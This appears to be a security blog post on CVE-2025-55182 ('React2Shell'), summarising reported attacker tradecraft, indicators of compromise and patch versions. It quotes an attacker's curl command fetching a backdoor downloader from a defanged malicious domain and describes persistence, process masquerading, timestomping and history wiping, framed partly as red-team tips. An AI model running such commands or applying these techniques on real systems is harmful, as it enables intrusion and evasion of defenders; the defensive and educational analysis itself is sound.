---
title: " React2Shell (CVE-2025-55182) "
description: >-
    The New "God Mode" for Web RCE: Analyzing React2Shell Exploits and Attacker Tradecraft
author: anorak
date: 2025-12-07 03:10:00 +0530
categories: [ GUIDE, CYBERSECURITY]
tags: [Cybersecurity, Security, Threat Intelligence, RCE, OSCP ]
pin: False  
--- 


## Introduction: The "Log4j" of 2025?

If you thought the holidays would be quiet, think again. On December 3, 2025, the cybersecurity world was hit with **CVE-2025-55182**, widely dubbed **"React2Shell"** with a CVSS rating of 10.0.

This is not a complex, multi-stage exploit chain. This is a **CVSS 10.0 Unauthenticated Remote Code Execution (RCE)** vulnerability. It affects **React Server Components (RSC)**, which powers massive frameworks like **Next.js**.

For Red Teamers and OSCP aspirants, this is the Holy Grail: a single HTTP request that grants code execution as the web server user. For Blue Teamers, it is a nightmare scenario where the mere presence of a vulnerable package allows compromise.

Google Threat Intelligence Group (GTIG) has released a comprehensive report detailing how threat actors from state-sponsored espionage groups to opportunistic cryptominers are weaponizing this *right now*. Let's break down their tradecraft.

![ Number of hourly firewall hits  ](/assets/img/202512/hits.png){: .center}
-----

## The Vulnerability: CVE-2025-55182

**The Core Issue:**
The flaw resides in how React Server Components (versions 19.0 through 19.2.0) handle requests. An attacker can send a crafted HTTP payload that the server processes unsafeley, leading to arbitrary command execution.

**Why it's Dangerous:**

1.  **Unauthenticated:** No login required.
2.  **Ubiquitous:** Next.js is the backbone of the modern web.
3.  **Low Complexity:** Valid payloads are circulating, and despite some initial confusion with AI-generated fake PoCs, legitimate exploits including in-memory web shells are now in the wild.

-----

## Threat Actor Tradecraft: Analyzing the Campaigns

What makes this report interesting for OSCP learners isn't just the exploit, but **what the attackers do after they get a shell**. The post-exploitation techniques observed by GTIG are a masterclass in Linux persistence and pivoting.

### 1\. The Pivot: UNC6600 and "MINOCAT"

**Actor:** China-nexus Espionage (UNC6600)

This group isn't just dropping a reverse shell; they are setting up a sophisticated tunnel to route traffic.

  * **The Tool:** **MINOCAT**. This is a custom tunneler containing an embedded **Fast Reverse Proxy (FRP)** client.
  * **The Setup:**
    1.  Creates a hidden directory: `$HOME/.systemd-utils` (Classic Linux stealth).
    2.  **Process Management:** Kills competing processes named `ntpclient` to free up resources or remove rival malware.
    3.  **Persistence:**
          * Creates a `systemd` service.
          * Modifies the user's shell config (e.g., `.bashrc`) to relaunch the malware whenever a legitimate user logs in.

**Red Team Takeaway:** FRP is a staple in OSCP and real engagements for pivoting. Hiding your binary in "dot" directories (hidden folders) like `.systemd-utils` is simple but effective against basic `ls` enumeration.

### 2\. The Living-Off-The-Land Downloader: SNOWLIGHT

**Actor:** UNC6586

This group prefers standard tools to blend in.

  * **The Tactic:** They execute a command using `cURL` or `wget` (tools likely already allowed through the firewall).
  * **The Command:**
    ```bash
    curl -fsSL -m180 reactcdn.windowserrorapis[.]com:443/?h=... -o <filename>
    ```
  * **The Payload:** **SNOWLIGHT**, a downloader for the VSHELL backdoor.
  * **Stealth:** Note the domain `windowserrorapis[.]com`. It looks semi-legitimate to a hurried analyst glancing at logs.

### 3\. The C2 Hider: HISONIC

**Actor:** UNC6603

This is the most advanced tradecraft in the report. Instead of connecting to a suspicious IP, the **HISONIC** backdoor talks to legitimate cloud services.

  * **Infrastructure:** Uses **Cloudflare Pages** and **GitLab** for Command and Control (C2).
  * **Obfuscation:** The configuration is XOR-encoded and hidden between magic markers (`115e1fc47977812` and `725166234cf88gxx`).
  * **Why this matters:** Most firewalls allow traffic to Cloudflare and GitLab. Blocking this C2 channel is extremely difficult without deep packet inspection (DPI).

### 4\. The Evasion: ANGRYREBEL.LINUX

**Actor:** UNC6595

  * **Disguise:** The malware renames itself to `sshd` (OpenSSH Daemon) and hides in `/etc/`.
  * **Timestomping:** It modifies file timestamps to match the system, making it harder to find during forensic analysis.
  * **Anti-Forensics:** Executes `history -c` to wipe the command history immediately.

-----

## Indicators of Compromise (The Hunt)

If you are defending a network, or if you are doing a "Blue Team" module, here is what you look for.

**File System Artifacts:**

  * Hidden directories: `$HOME/.systemd-utils`
  * Suspicious scripts: `sex.sh` (Cryptominer installer), `b.sh`.
  * Binaries in `/tmp/` masquerading as `vim`.

**Network Indicators:**

  * Domains: `reactcdn.windowserrorapis[.]com`
  * IPs: `45.76.155[.]14` (COMPOOD C2), `82.163.22[.]139`.

-----

## Mitigation: Closing the Door

The only real fix is patching. WAF rules are a band-aid.

**Required Actions:**

1.  **Patch React Server Components:**
      * If on 19.0.x -\> Upgrade to **19.0.1**
      * If on 19.1.x -\> Upgrade to **19.1.2**
      * If on 19.2.x -\> Upgrade to **19.2.1** (or higher)
2.  **Audit Dependencies:** You might not use React directly, but a library you use might depend on it. Check your `package-lock.json`.

-----

## Final Thoughts for the Learner

React2Shell demonstrates the fragility of modern web supply chains. For the OSCP student, this report is a goldmine of post-exploitation ideas.

Don't just look at the exploit. Look at how UNC6600 establishes persistence via `.bashrc`. Look at how UNC6595 disguises its process as `sshd`. These are the techniques that turn a simple shell into a persistent foothold.
 